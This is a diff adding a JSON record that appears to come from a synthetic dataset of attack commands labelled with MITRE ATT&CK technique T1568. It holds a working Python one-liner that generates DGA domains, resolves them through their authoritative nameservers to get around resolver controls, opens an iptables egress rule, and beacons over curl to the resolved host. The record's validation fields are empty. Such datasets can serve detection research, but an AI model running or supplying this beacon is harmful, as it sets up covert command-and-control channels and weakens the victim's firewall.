@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ns-pivot'; tlds=['com','net','org']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; ns=None; ip=None; port=random.choice([8088,9443,20080])\nfor d in dga(25):\n    resp=sr1(IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='NS')),timeout=3,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for rr in resp[DNS].an:\n            if getattr(rr,'type',0)==2:\n                ns=rr.rdata.rstrip('.') if isinstance(rr.rdata,str) else rr.rdata.decode().rstrip('.')\n                dom=d; break\n    if ns: break\nif ns:\n    r2=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=ns,qtype='A')),timeout=3,verbose=0)\n    if r2 and r2[DNS] and r2[DNS].an:\n        nsip=None\n        for a in r2[DNS].an:\n            if getattr(a,'type',0)==1:\n                nsip=a.rdata; break\n        if nsip:\n            r3=sr1(IP(dst=nsip)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=dom,qtype='A')),timeout=3,verbose=0)\n            if r3 and r3[DNS] and r3[DNS].an:\n                for a in r3[DNS].an:\n                    if getattr(a,'type',0)==1:\n                        ip=a.rdata; break\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{dom}:{port}/touch'])\n    print(dom,ip,port)\"",
+  "explanation": "Pivots to the authoritative NS for a DGA domain to resolve the final A record, helping bypass recursive resolver controls and enabling dynamic endpoint selection.",
+  "rationale_steps": [
+    "Identify NS records for a DGA domain with scapy.",
+    "Resolve the NS to an IP and query it directly for the A record.",
+    "Open a precise egress rule for the resolved IP and unusual port.",
+    "Beacon using curl to verify end-to-end connectivity."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-631f40b9",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
